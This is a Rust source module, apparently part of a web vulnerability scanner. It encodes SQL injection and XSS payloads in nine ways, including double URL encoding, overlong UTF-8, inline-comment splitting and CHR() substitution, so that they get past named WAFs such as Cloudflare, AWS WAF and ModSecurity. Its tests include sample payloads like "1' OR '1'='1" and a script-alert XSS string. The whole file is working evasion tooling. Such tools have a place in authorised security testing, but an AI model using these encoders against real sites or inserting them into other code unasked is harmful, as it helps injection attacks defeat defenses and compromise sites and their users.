//! WAF evasion module — encode payloads to bypass common WAFs
//! (Cloudflare, AWS WAF, ModSecurity, Akamai, etc.)

/// Encoding strategies for WAF bypass
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[allow(dead_code)]
pub enum EvasionStrategy {
    /// No encoding — raw payload
    None,
    /// Double URL encoding: ' → %27 → %2527
    DoubleUrlEncode,
    /// Unicode/UTF-8 overlong encoding: < → %C0%BC
    UnicodeOverlong,
    /// Mixed case for keywords: SELECT → SeLeCt
    CaseMixing,
    /// Inline comment obfuscation: UNION SELECT → UN/**/ION SEL/**/ECT
    InlineComment,
    /// Hex encoding for SQL strings: 'admin' → 0x61646d696e
    HexEncode,
    /// Concat/char bypass: ' → CHR(39) / CHAR(39)
    CharBypass,
    /// HTML entity encoding: < → &lt;  ' → &#39;
    HtmlEntity,
    /// Tab/newline insertion between SQL keywords
    WhitespaceSubstitution,
}

/// All available strategies for iteration
pub static ALL_STRATEGIES: &[EvasionStrategy] = &[
    EvasionStrategy::None,
    EvasionStrategy::DoubleUrlEncode,
    EvasionStrategy::CaseMixing,
    EvasionStrategy::InlineComment,
    EvasionStrategy::WhitespaceSubstitution,
    EvasionStrategy::HexEncode,
    EvasionStrategy::UnicodeOverlong,
    EvasionStrategy::HtmlEntity,
    EvasionStrategy::CharBypass,
];

/// Apply evasion encoding to a payload string
pub fn encode(payload: &str, strategy: EvasionStrategy) -> String {
    match strategy {
        EvasionStrategy::None => payload.to_string(),
        EvasionStrategy::DoubleUrlEncode => double_url_encode(payload),
        EvasionStrategy::UnicodeOverlong => unicode_overlong(payload),
        EvasionStrategy::CaseMixing => case_mixing(payload),
        EvasionStrategy::InlineComment => inline_comment(payload),
        EvasionStrategy::HexEncode => hex_encode_strings(payload),
        EvasionStrategy::CharBypass => char_bypass(payload),
        EvasionStrategy::HtmlEntity => html_entity(payload),
        EvasionStrategy::WhitespaceSubstitution => whitespace_sub(payload),
    }
}

/// Generate multiple encoded variants of a payload for WAF bypass attempts.
/// Returns (encoded_payload, strategy_used) pairs.
pub fn generate_variants(payload: &str) -> Vec<(String, EvasionStrategy)> {
    let mut variants = Vec::with_capacity(ALL_STRATEGIES.len());
    let mut seen = std::collections::HashSet::new();
    for &strategy in ALL_STRATEGIES {
        let encoded = encode(payload, strategy);
        if seen.insert(encoded.clone()) {
            variants.push((encoded, strategy));
        }
    }
    variants
}

/// Minimal set of evasion strategies (fast scan — fewer requests)
pub fn generate_fast_variants(payload: &str) -> Vec<(String, EvasionStrategy)> {
    let fast = &[
        EvasionStrategy::None,
        EvasionStrategy::DoubleUrlEncode,
        EvasionStrategy::CaseMixing,
    ];
    let mut variants = Vec::with_capacity(fast.len());
    let mut seen = std::collections::HashSet::new();
    for &strategy in fast {
        let encoded = encode(payload, strategy);
        if seen.insert(encoded.clone()) {
            variants.push((encoded, strategy));
        }
    }
    variants
}

// ─── Encoding implementations ───────────────────────────────────────────────

fn double_url_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 6);
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' => out.push(b as char),
            _ => {
                // First encode: %XX, then encode the %: %25XX
                out.push_str(&format!("%25{:02X}", b));
            }
        }
    }
    out
}

fn unicode_overlong(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 6);
    for b in s.bytes() {
        match b {
            b'<' => out.push_str("%C0%BC"),
            b'>' => out.push_str("%C0%BE"),
            b'\'' => out.push_str("%C0%A7"),
            b'"' => out.push_str("%C0%A2"),
            b'/' => out.push_str("%C0%AF"),
            b'\\' => out.push_str("%C0%DC"),
            _ => out.push(b as char),
        }
    }
    out
}

fn case_mixing(s: &str) -> String {
    let keywords = [
        "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE",
        "AND", "OR", "ORDER", "GROUP", "HAVING", "LIMIT", "SLEEP", "WAITFOR",
        "DELAY", "BENCHMARK", "NULL", "SCRIPT", "ALERT", "ONERROR", "ONLOAD",
    ];
    let mut result = s.to_string();
    for kw in &keywords {
        let mixed = alternate_case(kw);
        // Case-insensitive replace
        let lower = kw.to_lowercase();
        let re_pattern = format!("(?i){}", regex::escape(&lower));
        if let Ok(re) = regex::Regex::new(&re_pattern) {
            result = re.replace_all(&result, mixed.as_str()).to_string();
        }
    }
    result
}

fn alternate_case(s: &str) -> String {
    s.chars()
        .enumerate()
        .map(|(i, c)| {
            if i % 2 == 0 {
                c.to_uppercase().to_string()
            } else {
                c.to_lowercase().to_string()
            }
        })
        .collect()
}

fn inline_comment(s: &str) -> String {
    let keywords = [
        "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE",
        "AND", "OR", "ORDER", "GROUP",
    ];
    let mut result = s.to_string();
    for kw in &keywords {
        let lower = kw.to_lowercase();
        let re_pattern = format!("(?i){}", regex::escape(&lower));
        if let Ok(re) = regex::Regex::new(&re_pattern) {
            let half = kw.len() / 2;
            let replacement = format!("{}/**/{}",
                &kw[..half].to_uppercase(),
                &kw[half..].to_uppercase()
            );
            result = re.replace_all(&result, replacement.as_str()).to_string();
        }
    }
    result
}

fn hex_encode_strings(s: &str) -> String {
    // Encode single-quoted string literals to hex: 'abc' → 0x616263
    let mut result = s.to_string();
    let re = regex::Regex::new(r"'([^']+)'").unwrap();
    result = re.replace_all(&result, |caps: &regex::Captures| {
        let inner = &caps[1];
        let hex: String = inner.bytes().map(|b| format!("{:02x}", b)).collect();
        format!("0x{}", hex)
    }).to_string();
    result
}

fn char_bypass(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 8);
    for b in s.bytes() {
        match b {
            b'\'' => out.push_str("CHR(39)"),
            b'"' => out.push_str("CHR(34)"),
            b'<' => out.push_str("CHR(60)"),
            b'>' => out.push_str("CHR(62)"),
            b' ' => out.push_str("CHR(32)"),
            _ => out.push(b as char),
        }
    }
    out
}

fn html_entity(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 6);
    for c in s.chars() {
        match c {
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '\'' => out.push_str("&#39;"),
            '"' => out.push_str("&quot;"),
            '&' => out.push_str("&amp;"),
            _ => out.push(c),
        }
    }
    out
}

fn whitespace_sub(s: &str) -> String {
    // Replace spaces between SQL keywords with tabs or newlines
    let keywords = [
        "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE",
        "AND", "OR", "ORDER", "SLEEP", "WAITFOR",
    ];
    let mut result = s.to_string();
    for kw in &keywords {
        let lower = kw.to_lowercase();
        // " UNION " → "\tUNION\t"
        let pattern = format!("(?i) {} ", regex::escape(&lower));
        if let Ok(re) = regex::Regex::new(&pattern) {
            let replacement = format!("\t{}\t", kw);
            result = re.replace_all(&result, replacement.as_str()).to_string();
        }
    }
    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_double_url_encode() {
        let encoded = double_url_encode("'");
        assert_eq!(encoded, "%2527");
    }

    #[test]
    fn test_double_url_encode_angle() {
        let encoded = double_url_encode("<script>");
        assert!(encoded.contains("%253C"));
        assert!(encoded.contains("%253E"));
    }

    #[test]
    fn test_case_mixing() {
        let result = case_mixing("UNION SELECT");
        assert_ne!(result, "UNION SELECT");
        assert!(result.to_lowercase().contains("union"));
        assert!(result.to_lowercase().contains("select"));
    }

    #[test]
    fn test_inline_comment() {
        let result = inline_comment("UNION SELECT");
        assert!(result.contains("/**/"));
    }

    #[test]
    fn test_hex_encode() {
        let result = hex_encode_strings("1' OR '1'='1");
        assert!(result.contains("0x"));
    }

    #[test]
    fn test_unicode_overlong() {
        let result = unicode_overlong("<script>");
        assert!(result.contains("%C0%BC"));
        assert!(result.contains("%C0%BE"));
    }

    #[test]
    fn test_generate_variants_dedup() {
        let variants = generate_variants("test");
        // "test" has no special chars, so many strategies will produce "test"
        // dedup should reduce count
        let unique: std::collections::HashSet<_> = variants.iter().map(|(s, _)| s.clone()).collect();
        assert_eq!(unique.len(), variants.len());
    }

    #[test]
    fn test_html_entity() {
        let result = html_entity("<script>alert('xss')</script>");
        assert!(result.contains("&lt;"));
        assert!(result.contains("&gt;"));
        assert!(result.contains("&#39;"));
    }

    #[test]
    fn test_char_bypass() {
        let result = char_bypass("' OR '1'='1");
        assert!(result.contains("CHR(39)"));
    }

    #[test]
    fn test_whitespace_sub() {
        let result = whitespace_sub("1 UNION SELECT");
        assert!(result.contains('\t'));
    }

    #[test]
    fn test_fast_variants_subset() {
        let fast = generate_fast_variants("1' OR '1'='1");
        let full = generate_variants("1' OR '1'='1");
        assert!(fast.len() <= full.len());
        assert!(fast.len() >= 1);
    }
}
